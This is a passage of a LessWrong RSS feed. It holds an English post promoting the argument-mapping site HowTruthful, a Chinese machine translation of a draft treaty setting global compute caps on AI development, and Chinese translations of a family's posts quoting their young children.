href="https://www.lesswrong.com/posts/FRd6nNj3M33w2CSX5/aci-6-a-non-dualistic-aci-model#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/FRd6nNj3M33w2CSX5/aci-6-a-non-dualistic-aci-model<guid ispermalink="false"> FRd6nNj3M33w2CSX5</guid><dc:creator><![CDATA[Akira Pyinya]]></dc:creator><pubDate> Fri, 10 Nov 2023 00:42:39 GMT</pubDate> </item><item><title><![CDATA[How I got so excited about HowTruthful]]></title><description><![CDATA[Published on November 9, 2023 6:49 PM GMT<br/><br/><p> <i>This is the script for a</i> <a href="https://www.youtube.com/watch?v=XqoJAyihJ_c"><i>video</i></a> <i>I made about my current full-time project. I think the LW community will understand its value better than the average person I talk to does.</i></p><p> Hi, I&#39;m Bruce Lewis. I&#39;m a computer programmer. For a long time, I&#39;ve been fascinated by how computers can help people process information. Lately I&#39;ve been thinking about and experimenting with ways that computers help people process lines of reasoning. This video will catch you up on the series of thoughts and experiments that led me to HowTruthful, and tell you why I&#39;m excited about it. This is going to be a long video, but if you&#39;re interested in how people arrive at truth, it will be worth it.</p><p> Ten or 15 years ago I noticed how online discussion forums really don&#39;t work well for persuading people of your arguments. Instead of focusing on facts, people get sidetracked, make personal attacks, and go in circles. Very rarely do you see anyone change their mind based on new evidence.</p><p> This got me thinking about what might be a better format than posts, comments and replies for arguments. I thought about each statement being its own thing, and statements would be linked by whether one statement argues for or against another statement. If you repeat a statement it would use the existing thing rather than making a new one, making it easier to avoid going in circles. And it would encourage staying focused on the topic at hand and not getting sidetracked.</p><p> I kept this idea in the back of my head, but didn&#39;t do anything with it.</p><p> A few years later, I was baffled by the success of Twitter. Its only distinguishing feature at that time was that you were limited to 140 characters. Everybody complained about this. But I started to think the limit was the secret to its success. Yes, it&#39;s a pain that you&#39;re limited to 140 characters. You have to work hard to make what you want to say concise enough to fit. But the great thing was that everyone else also had to work hard to be concise.</p><p> So the idea of forced conciseness stirred around in the back of my mind and started to mix with my other idea about a format for arguments that would help people stay focused. And then a third idea joined them, for making it quick and easy for people when they&#39;re ready to change their mind.</p><p> In 2018, when political discussion in my country was getting very polarized, these three ideas came to the front of my mind and I started working seriously on them. Or, I should say, working on them as seriously as I could in my spare time while holding an unrelated day job. I did get a working version onto a domain I bought, howtruthful.com, but it didn&#39;t get traction.</p><p> Then this year, in January, I got an email from my employer saying that they were reducing their workforce, and my role was impacted. My employment was to end 9 months later on October 27. I went through a sequence of responses to this. First I had a sinking feeling, and it seemed unreal. Then later, after I looked at the severance package and bonus for staying the whole 9 months to the exit date, I thought it was all great. I would have enough money to work full time for months on projects that I think are valuable, like HowTruthful. Then, a few months later, I had nagging doubts. Maybe I should find a transfer position and not leave my employer.</p><p> There were a lot of considerations in this big career decision, and I set up appointments with 3 different volunteer career coaches who had experience with entrepreneurship. I met with the first one and explained my dilemma, but didn&#39;t say anything about HowTruthful. He listened intently, then said, &quot;This is not something I can decide for you. Here&#39;s what I suggest you do. Get a piece of paper. Write down all the pros and all the cons of staying here, and see if the decision becomes obvious.&quot;</p><p> I couldn&#39;t help laughing out loud. Then I told him that the project I was considering working on full-time was one for organizing pros and cons. But I took his advice, and the results are <a href="https://en.howtruthful.com/o/i_should_stay_with_my_employer/29f76168a4a697c41ff49c685f5e426e">right here</a> .</p><p> This is an opinion page on HowTruthful. An opinion has three parts: the main statement up at the top, a truthfulness rating, which is the colored circles numbered one through five, and then evidence, both pro and con. For those who haven&#39;t seen HowTruthful before I&#39;ll explain each of the three parts.</p><p> First, the main statement. It&#39;s not a question. It&#39;s a sentence stated with certainty. As you change your mind about how truthful the main statement is, you don&#39;t change the sentence. You only change the truthfulness rating. This is how formal debates work. And even for an issue that you&#39;re deciding by yourself, changing the truthfulness rating is faster than editing a sentence to reflect how truthful you think the fact is.</p><p> And that brings us to the truthfulness rating. This is your opinion, not the computer&#39;s. Like the statement and the evidence, this is by humans, for humans. It&#39;s a simple five-point scale. One is false, three is debatable, five is true, and there are just two in-between ratings.</p><p> You might be asking, where do you draw the line between each rating? My suggestion, not in any way enforced, is to use this scale in a way that&#39;s practical to act upon, not according to any percent probability. For example, the two statements &quot;If I go out today with no umbrella I won&#39;t get wet&quot; and &quot;If I drive today with no seatbelt I won&#39;t get hurt&quot; could have the same percent probability, but you&#39;d rate one false and the other true based on their practical applications.</p><p> OK, so finally there&#39;s the evidence. Anything one might say to argue for the main statement goes under Pro. Anything one might say to argue against it goes under Con. Just like the main statement, these each have their own truthfulness rating that can be changed quickly without having to edit the sentence. For example, this first argument for staying at my employer wasn&#39;t always rated false. If instead of changing it to false I had to edit it to say &quot;there&#39;s no transfer position...&quot; that would have made it an argument against the main statement and I would have had to move it to the other section.</p><p> Now when I say &quot;just like the main statement&quot; I really mean it. Because just like with the main statement, there can be sub-arguments for each of the pros and cons. That&#39;s what the numbers in parentheses mean. For example, there&#39;s one con argument for this first one. If we click through, now we&#39;re treating the thing we clicked on as the main statement. And you can keep going down as deep as the argument calls for.</p><p> I realize this is very different from other web sites. It&#39;s unfamiliar and takes getting used to. But look at the clarity and focus that results once you put it all together. There are so many considerations underneath this decision, but now they&#39;re organized under 5 main arguments. I can get the big picture a lot faster.</p><p> Everything I&#39;ve shown you so far is available to use now, and is free. Of course, to be sustainable this has to make money. And I don&#39;t think advertising really fits on a site where people are trying to ascertain truth. I&#39;ll show you the paid part. I&#39;m going to click the pencil up here to edit my opinion, then expand the editing options here, and change this from private to public. So keeping your opinions to yourself is free, sharing them with the world is the paid version. By charging 10 dollars per year (that&#39;s right, year, not month), about the cost of a paperback book, I can make it costly for people to create accounts they know will be shut down for violating the terms of service, while keeping it cheap for people who want to sincerely seek truth. I&#39;m looking for five people in the next week who are also excited about this idea and are willing to invest $10 in addition to their time to help me figure out where to take it from here. But even if you&#39;re not one of those, give it a spin in the free functionality and let me know what you think. Just visit howtruthful.com and click the &quot;+ Opinion&quot; button in the lower left. You don&#39;t need to log in.<br></p><br/><br/> <a href="https://www.lesswrong.com/posts/f2CftRRndH97RpAwL/how-i-got-so-excited-about-howtruthful#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/f2CftRRndH97RpAwL/how-i-got-so-excited-about-howtruthful<guid ispermalink="false"> f2CftRRndH97RpAwL</guid><dc:creator><![CDATA[Bruce Lewis]]></dc:creator><pubDate> Fri, 10 Nov 2023 00:34:17 GMT</pubDate> </item><item><title><![CDATA[International treaty for global compute caps]]></title><description><![CDATA[Published on November 9, 2023 6:17 PM GMT<br/><br/><p>我最近与 Andrea Miotti 合作起草了一份实施全球计算上限的<a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=4617094"><strong>条约草案</strong></a>。我在下面附上了我们论文的<strong>摘要</strong>和<strong>条约文本</strong>。</p><p>该条约旨在实现<strong>计算限制的分层方法</strong>，如下图所示，来自我们的<a href="https://arxiv.org/abs/2310.20563"><strong>政策报告</strong></a>： </p><figure class="image image_resized" style="width:82.53%"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/3gi9YKuYQmMzxPF5y/zjfkjvl2upvedg1ienli" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/3gi9YKuYQmMzxPF5y/ijmgvbeneslo5uqjhgao 170w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/3gi9YKuYQmMzxPF5y/nj9hqvvhtjqzhnddtfze 340w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/3gi9YKuYQmMzxPF5y/c0jo4mitwrdtwxoym6id 510w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/3gi9YKuYQmMzxPF5y/kzoytlgki438ncwtn40r 680w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/3gi9YKuYQmMzxPF5y/hbdubqeyaw4dhkk1yx0f 850w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/3gi9YKuYQmMzxPF5y/gsuvryjla0nq1yzyfxa0 1020w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/3gi9YKuYQmMzxPF5y/z24klozwkz76gskmsfrg 1190w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/3gi9YKuYQmMzxPF5y/iiohnqqyqeeji18a5m6v 1360w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/3gi9YKuYQmMzxPF5y/cotfthjvuly3axkiv6sd 1530w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/3gi9YKuYQmMzxPF5y/bffpo8zvh3gtcul4si0f 1614w"></figure><p>旁白：我对旨在加强该条约、更详细地描述计算限制并讨论实现全球计算上限的替代路径的后续工作感兴趣。有越来越多的人对开发、加强和倡导全球计算上限和相关提案感兴趣。如果您对此感兴趣，<strong>请随时与我们联系</strong>。</p><h2><strong>抽象的</strong></h2><p><a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=4617094">本文</a>提出了一项减少先进人工智能 (AI) 发展风险的国际条约。该条约的主要条款是全球计算上限：禁止开发超过商定的计算资源阈值的人工智能系统。该条约还提议制定和测试应急计划、谈判建立一个国际机构来执行该条约、建立新的沟通渠道和举报人保护，以及承诺避免人工智能军备竞赛。我们希望该条约能够成为全球领导人实施治理制度以保护文明免受先进人工智能威胁的有用模板。</p><h2><strong>条约</strong></h2><p><strong>禁止危险人工智能条约</strong></p><p><i>本条约缔约国</i>，</p><p><i>深切关注</i>先进人工智能引发的灾难将给全人类带来灾难性后果，</p><p><i>确认</i>需要尽一切努力避免此类灾难的危险并采取措施维护国际和平与安全，</p><p><i>申明</i>人工智能带来的风险至少与核战争、不受控制的流行病和其他全球安全重大威胁一样严重，</p><p><i>相信</i>只有当国际社会确信这些技术可以被控制并且必要的国家和国际治理措施已经建立时，人类水平的人工智能或超级人工智能的创造才应该发生，</p><p><i>认识</i>到人工智能带来的全球安全风险可能来自不受控制的人工智能系统，也可能来自人类滥用，</p><p><i>决心</i>消除和防止国家之间和企业之间的人工智能竞赛动态，这种动态会显着增加灾难的风险，</p><p><i>承认</i>一旦先进的人工智能能够安全开发和管理，这种技术就能给人类带来好处，</p><p><i>表示</i>支持研究、开发和其他努力，以保障强大的人工智能硬件的生产和贸易，并确定监控硬件法规遵守情况的隐私保护方法，</p><p><i>重申</i>联合国致力于实现国际合作，解决经济、社会、文化或人道主义性质的国际问题，</p><p><i>敦促</i>所有国家合作预防人工智能造成的灾难，</p><p><i>希望</i>进一步促进先进硬件的监控，避免人工智能军备竞赛，消除和防止过早开发人类水平的人工智能、人工超级智能和其他形式的高度危险的人工智能，</p><p><i>经同意</i>如下：</p><h3><strong>第一条</strong></h3><p><i><strong>定义</strong></i></p><p>就本条约而言：</p><ol><li> “先进硬件”是指强大的计算半导体芯片或集成电路，可用于构建高于危险阈值的人工智能系统。</li><li> “算法改进”是指人工智能算法、方法论、架构或技术的进步，从而导致：(a) 减少开发先进人工智能系统所需的计算资源、数据、时间或成本，或 (b)人工智能能力的提升。</li><li> “人工智能”整体或单独指以下各项：<br><ol><li>任何在变化和不可预测的情况下执行任务而无需大量人工监督的人工系统，或者在接触数据集时可以从经验中学习并提高性能的人工系统。</li><li>在计算机软件、物理硬件或其他环境中开发的人工系统，用于解决需要类人感知、认知、规划、学习、交流或身体动作的任务。</li><li>旨在像人类一样思考或行动的人工系统，包括认知架构和神经网络。</li><li>一组旨在近似认知任务的技术，包括机器学习。</li><li>旨在理性行动的人工系统，包括智能软件代理或实体机器人，通过感知、计划、推理、学习、沟通、决策和行动来实现目标。</li><li>一种基于机器的系统，能够通过针对给定目标集产生输出（预测、建议或决策）来影响环境。它使用机器和/或基于人类的数据和输入来（i）感知真实和/或虚拟环境； (ii) 通过自动方式（例如通过机器学习）或手动分析将这些感知抽象为模型； (iii) 使用模型推理来制定结果选项。</li></ol></li><li> “通用人工智能”或“人类水平的人工智能”是指在各种智力任务中实现人类水平表现的人工智能，而不局限于狭窄或特定的专业领域。</li><li> “人工智能超级智能”是指在大多数或所有领域超越人类水平的人工智能，可能包括一般问题解决、社交技能、规划和战略思维、科学研究和人工智能开发。</li><li> “计算”是指用于训练、验证、部署和运行人工智能算法和模型的处理能力和其他电子资源。</li><li> “危险的人工智能系统”包括“人类水平的人工智能”、“通用人工智能”、“超级人工智能”以及任何构成严重全球或国家安全风险的人工智能系统。</li><li> “浮点运算”（FLOP）是指单精度（32 位）浮点运算。</li><li> “举报人”是指向其境内进行非法或危险的人工智能开发行为的国家或受信任的国际机构举报非法或危险的人工智能开发行为的任何个人</li></ol><h3><strong>第二条</strong></h3><p><i><strong>一般义务</strong></i></p><ol><li>各缔约国承诺禁止民用或军用开发、部署、转让、拥有和使用超过暂停阈值的人工智能系统。</li><li>每个缔约国承诺监管高于危险阈值但低于暂停阈值的人工智能系统的开发和使用，以便任何开发或使用高于危险阈值（但低于暂停阈值）的系统的实体必须表明他们正在遵守适当的法规和保障措施。例如，信息安全要求、概率风险评估、危险能力预测、第三方审计以及其他保护安全和基本权利的法规。</li><li>暂停阈值和危险阈值最初应根据开发人工智能系统（作为模型功能的代理）所需的计算来设置。暂停阈值将从 10ˆ24 浮点运算开始，危险阈值将从 10ˆ21 FLOP 开始。</li><li>各缔约国承诺禁止为民用或军事目的开发和使用人类水平的人工智能、通用人工智能（AGI）、超级人工智能（ASI）或其他形式的高度危险的人工智能系统。</li><li>各缔约国承诺实施全面的法规来监测人工智能的发展，报告任何涉嫌开发或使用一种或多种高度危险的人工系统或涉嫌试图开发或使用一种或多种人工系统的情况。向联合国安理会报告高度危险的人工智能系统，并调查可信的威胁。</li></ol><h3><strong>第三条</strong></h3><p><i><strong>阈值修正</strong></i></p><ol><li>本条约生效一年后，应在瑞士日内瓦召开缔约方会议，以审查暂停阈值。</li><li>缔约国至少每年一次在瑞士日内瓦举行会议，以审查暂停阈值。暂停阈值和危险阈值的定义被认为是不完善的代理，将随着时间的推移进行更新。人们进一步认识到，由于人工智能发展的算法进步和其他改进（例如，新提示技术的发现），随着时间的推移，危险人工智能系统的开发、获取、拥有或使用将需要更少的计算资源。</li></ol><h3><strong>第四条</strong></h3><p><i><strong>应急预案</strong></i></p><ol><li>每个缔约国承诺制定和测试一项或多项应急计划，在该计划中，各国展示出迅速发现和阻止危险人工智能开发的能力（例如，在超过暂停阈值之前或之后立即停止训练）或阻止扩散危险的人工智能模型（例如，撤回应用程序编程接口（API）访问）。</li><li>各缔约国承诺定期测试其应急响应计划，以确保各国有能力在发生紧急情况时有效应对。</li><li>各缔约国同意真诚地分享与监测人工智能能力和发展有关的信息。</li></ol><h3><strong>第五条</strong></h3><p><i><strong>监督和执行</strong></i></p><ol><li>各缔约国承诺采取适当措施确保本条约的执行，包括发展执行该条约所需的基础设施。</li><li>各缔约国承诺自行向有关国际当局报告大规模集中先进硬件的数量和地点。</li><li>每个缔约国都认识到，自我报告程序必须允许对已申报设施中的先进硬件进行全面核查，以监测其没有被用于开发超过暂停阈值的人工智能，并允许检测任何未申报或未申报的设施。拥有大量先进硬件的秘密设施。</li><li>每个缔约国都认识到需要制定一项允许独立评估人员在其境内进行调查的议定书，并承诺为此进行真诚的谈判。</li></ol><h3><strong>第六条</strong></h3><p><i><strong>建立一个国际监测、执行和研究组织的谈判</strong></i></p><ol><li>各缔约国承诺进行真诚谈判，建立一个国际机构，以核查其根据本条约承担的义务的履行情况。该国际机构的主要目的是确保条约的规定得到有效执行。</li><li>该机构还将负责研究功能强大的人工智能系统，最终目标是了解如何控制功能强大的人工智能系统，并确保它们的开发只是为了造福全人类。</li><li>该机构将负责调整暂停阈值和危险阈值。如果该机构获得令人信服的证据，证明他们能够安全地构建和部署人类水平的人工智能和人工智能，那么暂停门槛可能会被取消。</li></ol><h3><strong>第七条</strong></h3><p><i><strong>分享安全人工智能的好处</strong></i></p><p>各缔约国承诺真诚合作，制定有效措施，确保安全和有益的人工智能系统的潜在利益在全球范围内传播。</p><h3><strong>第八条</strong></h3><p><i><strong>传达危险并建立举报人保护</strong></i></p><ol><li>每个缔约国承诺建立并参与国际热线，以便各国领导人就人工智能相关的全球安全威胁问题进行直接沟通。</li><li>每个缔约国同意报告危险人工智能发展的证据、对危险能力的见解、涉嫌违反条约的行为以及对全球安全构成威胁的任何其他问题。 3. 各缔约国承诺为民用人工智能开发者建立类似的沟通渠道。民用人工智能开发人员将被要求分享危险人工智能开发的证据、对危险能力的见解、涉嫌违反条约的行为以及对全球安全构成潜在威胁的任何问题的任何信息。</li><li>每个缔约国承诺为向国家或受信任的国际实体报告非法或危险的人工智能开发实践的举报人提供适当的保护。</li></ol><h3><strong>第九条</strong></h3><p><i><strong>防止人工智能军备竞赛</strong></i></p><p>各缔约国承诺就停止人工智能军备竞赛和防止未来任何人工智能军备竞赛的有效措施进行真诚谈判。</p><h3><strong>第十条</strong></h3><p><i><strong>评审会议</strong></i></p><ol><li>本条约生效后，缔约国会议应至少每年在瑞士日内瓦举行一次。</li><li>会议的目的将是审查本条约的运作情况，以确保序言和条约条款的目的得到实现，讨论暂停阈值和危险阈值的可能变化，以考虑人工智能的进展（第二条所述），并讨论与人工智能全球安全威胁有关的其他事项。</li></ol><h3><strong>第十一条</strong></h3><p><i><strong>超出条约范围的国家法规</strong></i></p><ol><li>本条约中的任何内容均不影响任何国家或国家集团根据包括 FLIP 阈值以外的标准的定义实施法规的权利（例如基准性能、参数计数、人工智能可以应用的领域或存在某些危险能力）。</li><li>本条约的任何内容均不影响任何国家或国家集团对低于暂停和危险阈值的人工智能系统实施法规的权利，或适用于高于危险阈值（但低于暂停阈值）的系统的附加法规，这些法规不会干扰条约规定的义务。</li><li>每个缔约国都有责任对在该缔约国管辖范围内从事可能构成国家或全球安全威胁的活动的人工智能开发商实施自己的法规。</li></ol><h3><strong>第十二条</strong></h3><p><i><strong>解决争端</strong></i></p><p>当两个或两个以上缔约国之间就本条约的解释或适用发生争议时，有关各方应共同协商，通过谈判或按照各方选择的其他和平方式解决争端。 《联合国宪章》第三十三条。</p><h3><strong>第十三条</strong></h3><p><i><strong>签署、批准、生效和退出</strong></i></p><ol><li>本条约在生效前应开放供所有国家签署。</li><li>本条约须经签署国批准、接受或核准。该条约应开放供加入。</li><li>本条约应在第二份批准书交存之日起 60 天后生效。</li><li>对于在本条约生效后交存批准书、接受书、核准书或加入书的国家，本条约应在其交存批准书、接受书、核准书或加入书之日后第 30 天生效。</li><li>各缔约国在行使其国家主权时，如果认为与本条约主题有关的非常事件损害了其国家的最高利益，则有权退出本条约。它应向保存人发出撤回通知。此类通知应包括对其认为危及其最高利益的异常事件的陈述。该撤回仅在收到撤回通知之日起6个月后生效。</li><li>特此指定联合国秘书长为本条约的保存人。</li></ol><br/><br/> <a href="https://www.lesswrong.com/posts/3gi9YKuYQmMzxPF5y/international-treaty-for-global-compute-caps#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/3gi9YKuYQmMzxPF5y/international-treaty-for-global-compute-caps<guid ispermalink="false"> 3gi9YKuYQmMzxPF5y</guid><dc:creator><![CDATA[Akash]]></dc:creator><pubDate> Thu, 09 Nov 2023 18:17:04 GMT</pubDate> </item><item><title><![CDATA[Text Posts from the Kids Group: 2021]]></title><description><![CDATA[Published on November 9, 2023 5:50 PM GMT<br/><br/><p> <a href="https://www.jefftk.com/p/making-groups-for-kid-pictures">Facebook</a><span>又一轮解放儿童帖子</span>。作为参考，2021 年莉莉 7 岁，安娜 5 岁，诺拉出生。</p><p> （其中一些来自我；一些来自朱莉娅。说“我”的人可能指的是我们中的任何一个。）</p><p></p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3358180434323149/?__cft__%5B0%5D=AZU8msx93CJo6U9Mf6gPlFBiylbQswXnhHb3p_LXrKjWWrJqoth1iqZPnwbqUpqPbmS5aoniJKawjl41JuBX8iYr8rCyzWEX9ujkMjAn2eIANqMoojSQ_52Q1YsaUQHZD1yMig-QuVmfuTJXMh5kqWT_WrMOJLxctQe6VmRYHv3QZci6CxHoPxomGx0GGce-InE&amp;__tn__=%2CO%2CP-R">2021-01-02</a><p>安娜：你好，我是汉堡先生。</p><p>我：汉堡先生，该刷牙了。</p><p>安娜：我不会刷牙，我是一个汉堡包。</p><p>我：还没到刷牙时间呢。</p><p>安娜：汉堡包没有牙齿。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3359536540854205/?__cft__%5B0%5D=AZVqRzm0F72NByMu5BfLcl75dfy0HIDo0b7fkJS4OylBspL1UHb6INBDPJrX2ts2tKP4ZwdeBPsWvAegINWyMprR8CSoj1l8rJtNbGfzu-2CSMbbySzENrZPmZYD9Ixm33Y_4tmOBwxXBHzMa3vx6aGfUR8sUuWrkIb2GEyplq71onoEKJVU2sWelxLwUbefjzM&amp;__tn__=%2CO%2CP-R">2021-01-04</a><p> “安娜，试着把你的头撞到水龙头上！我试过了，新的软盖很管用！”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3364393433701849/?__cft__%5B0%5D=AZXdrcnw9IFqpjPmkblD4unRditwUDoukt-5ogz_saDmj9KOXiH6rMiW8jLXT7oNEvpDCSN5DgUn8wu2NBEAuacSf7opJhrLCPSiR5L_tkoyq6nPTJt5AXg9Ih8HjeLSfhYvDHOTodPvYwNlxg2RrQLaUKrj96IX9sGMb96XOFDbuRYzncGPgKlEJ4ocQz_opq8&amp;__tn__=%2CO%2CP-R">2021-01-10</a><p>上周莉莉说她想要刘海。我告诉她，任何重大理发都有三周的等待期，并设置了一个日历提醒，让我们在三周后再次讨论它。她同意了。</p><p>两天后，她问道：“如果我有刘海，头发会全部剪短吗？”</p><p>我问：“……你知道什么是刘海吗？”</p><p> “不。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3375835309224328/?__cft__%5B0%5D=AZUxz3FbFMl9-LpsfkCriGJzZ2sKb9E4xUEfhvdeQ05ufdYTOtunOLMo2WNE0RLKfP8eWUKkWigJ6-HT2pgY2LJHl_UjrkIJCXRZUCaRKwp8KHC3Tjnazi2ME8r7cUKuleZuNigfU74UuE9cLhSSTAn9OO5jmM1Tyql7oF23dRC3dzc_JNI0z_NAsQ6FDGUG9b4&amp;__tn__=%2CO%2CP-R">2021-01-25</a><p>我们一直在读《棚车孩子们》，孩子们对在树林里玩耍很兴奋。莉莉带着装满东西的枕套下了楼。</p><p> “妈妈，我们假装自己是穷人，我们发现的钱只够买两张沙发、两个枕头、一个锅、一些玩具和这条项链。而我的钱只够买这艘海盗船和两条项链。”娃娃。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3377835462357646/?__cft__%5B0%5D=AZXHpfyNYg3yyOrqPRg_wXuZxJ9kcZs9JruazQI4m_0UCcuDi-o3n-RuvZrLy7ex1X6oEGglWYAPPz1opSNEzTmmlvuV31U6J5__-dITbiNcK-itvjc3EN794fFgs2dGDEZE7A9B2_OhxC00QHA7kuWX7KRxp-MdyS7X0SanvdOMNz-bcyi_6lW_H_TbRr6X0yk&amp;__tn__=%2CO%2CP-R">2021-01-27</a><p> “爸爸，为什么海绵是软软的？像老鼠一样？”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3377886645685861/?__cft__%5B0%5D=AZVF5w-1PPSucsBjm8HhihTr58lfpCdIC3lzuUHKFXywAhKo-9sNt21tPW8Vqz-ui7SvsGIgP2CG3m0LAXX1sMuXw9-8-bSgg0lC-4AfTyhbVMqo2w3TzDWonrYENiwuy3AWid3GHknyDzRiyxvwOkbrtyag3np2C3XNILbARWpausk8Z8MN3E53dvbkYiCfofg&amp;__tn__=%2CO%2CP-R">2021-01-27</a><p>杰夫：晚安，安娜。</p><p>安娜：哟哟哟哟哟哟！这是“你是世界上最好的爸爸”的宝贝。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3381390805335445/?__cft__%5B0%5D=AZVOLrFX-HwYnGbuZntnSMZgaqgQyPOPYXab1wxewd-7GvOMuGSjf3q3ZSeewS4zcbrMKpH8iZSZT5va7oYFDBryv5YNJ_5SG8eP3Czu4RZhU-5dSPxtpjBBHw1lytgzsu2F4DfyRlrtOCbAolyFu7-nLerizpKTxIuqswY-6SYsy84B-4fqfvN2GIzD8MWlu8M&amp;__tn__=%2CO%2CP-R">2021-02-01</a><p>醒来时莉莉给安娜读书</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3383374941803698/?__cft__%5B0%5D=AZWUVUCAjPAEloPw66SxCyHD9BNTduds81Q52njLYC4g-v59WU3CLEPEpkLLtY0eDeZLqPeXV6ns9ybZdcTCewvwv1FYL8CIC-34MU_fVTTR2kSEFU8G3bh_1uXTHELcG2pmx98K_mVdyi04AjPv8sO5lF8ou3-j6Q4_qALbzBR3yIGVHtJsPAFTkC4C6Rf2Vlk&amp;__tn__=%2CO%2CP-R">2021-02-03</a><p>莉莉的假设：“妈妈，如果你生活在花生壳里，你唯一的食物就是芝士——它这么大”[举起手指到豌豆大小]“你睡在石头做的鞋里，还有一百个孩子住在那里，你会找别的地方住吗？”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3385911091550083/?__cft__%5B0%5D=AZWsj_TQb0OdfY7jg-JrfzBwxhP4E4hlToHWadtoLbnNAZpjNDIzZUwebPfK5nuNvwJjS82hfbt81aZjwa6nQ3rgz5ap-zGZy_nYgXXWPl92R2iiDa6jCd1AuBgBJaHvN4_UrroBI8_mzjmOUP_2pfZKXcHlcHAgvzfeLFF2NA1S0gCJQdMABQTUUcEI-RGkrRU&amp;__tn__=%2CO%2CP-R">2021-02-06</a><p>晚餐时莉莉发来的：</p><p> “有件事让我感到难过。<br> [开始唱歌]仙女不是真实的<br>魔法不是真实的<br>独角兽并不真实<br>圣诞老人不是真实存在的<br>aTooth Fairy 并不是真的。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3392063790934813/?__cft__%5B0%5D=AZUb_vG2gfeeaL2m5ss8Rf2BxMQB9X7uKCRGCNbuUB9Gl99FFIamaGHVZTXqjgjKVkwKgVDPJx7KQSydU3AYjJ4TFfwtNIQuyPHGvA8EjnOHtS3JB4ePKzphZpQ18JrJigKDq2Memoxk86H2Z2YBIJwijCSKv5-AyN1ysfT_elmjnWYwAwh4bt0ytMmWW1H0WZ8&amp;__tn__=%2CO%2CP-R">2021-02-14</a><p>莉莉解释了偶数和奇数之间的区别：“如果他们都可以排队参加反对派舞蹈并且都有一个舞伴，那就是偶数。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3392510177556841/?__cft__%5B0%5D=AZUjqDZZj48awhmcGBtaULBrsYR4kvnZdq5U8X6F1nvNjhFiPoPOJuvfrk4m2mu1xvDEoPypr7z2vOdfetceyj3MQWVI4ahX3hoRzIg1c1Z6Q0J2NwddFHt31pM1iCPv0Y5LK-o0OyXloBI_wW9_tuWtBhXWkRSPVUYJgrDB2PynBZmIuhjZbW87-XUsAvtRGnI&amp;__tn__=%2CO%2CP-R">2021-02-15</a><p>莉莉：“安娜，你为什么用哨子打我？”</p><p>安娜，没戴眼镜什么的：“对不起，我的视线被雾化了”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3392592304215295/?__cft__%5B0%5D=AZVaFveMrKAk30OGNNHXDVJZG8IFcwqD9te5QqVgQZBfe55oo6F9OcmweA-xdBzPfTZsyu81VSQvQHTTa1gKyuJlW8hdaPbuB8r_rWppgJOZdI9ZySAcKcowUGFnprzt0oQDL9mbpC_eKjMzf1uNSB1raANWOYgOn4DZXmUaH18pUWKuUZY8QEDAYn1jRcMRkFM&amp;__tn__=%2CO%2CP-R">2021-02-15</a><p>莉莉最喜欢与安娜交谈的话题之一就是“陷阱”。</p><p>莉莉：我正在和爸爸讨论我们能否养一匹小马。你真的也想要一匹小马吗？</p><p>安娜：是的。</p><p>莉莉：嗯，我们对小马几乎一无所知，而且我们没有足够的空间！ ...安娜，你认为当一名女牛仔很酷吗？</p><p>安娜：是的。</p><p>莉莉：嗯，你将不得不接受很少的报酬，你将不得不长时间工作，而且你甚至连一间睡觉的小屋都没有！</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3392830184191507/?__cft__%5B0%5D=AZXCrnRPSbKw7l1mwI1nb1-sUjGNBhTi-T9aaHSygCG7F4gFrA0dm_raePeftlg_hmWW1qgsYYza-_8qYQHDdngT282v6lGgLo5eYHou-jBBY8jfKxm3iw3qjbIq-w1HxumoyF6xzgwg_wN-rdxsM8X8heofJ2ryS69tjt1k98teUXPUQN_NtMPUYE71GiaeZ2E&amp;__tn__=%2CO%2CP-R">2021-02-15</a><p>莉莉：“我非常生气第五修正案仍然存在！肯定需要有人删除那个东西”</p><p> ...</p><p>昨天我解释了辩诉交易，她也觉得不好。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3395118230629369/?__cft__%5B0%5D=AZW_UZNzvVigV4GipVsfy1rExHkFmEQaowFMgYhXLnfGvfVZ19ii-BB5q2hT4TfO4dLIkhRVUZ6x6103j2UKDzNoS59ZyhrSNQYdDEgU8N2LGR72IdJo5nbBEES7ysm1VOy3TGI8OUw1_JX7YPyY3xwt3JG3E74WOOKoc2F1hpsr52q3p2KL62d7DwSgBVVeptk&amp;__tn__=%2CO%2CP-R">2021-02-18</a><p>安娜，我们坐下来吃晚饭后立即说道：“这里有一些关于牙齿的事实。牙齿是从这些东西[指牙龈]中长出来的坚硬的白色刀片。它们可以切割和磨削。”</p> <a 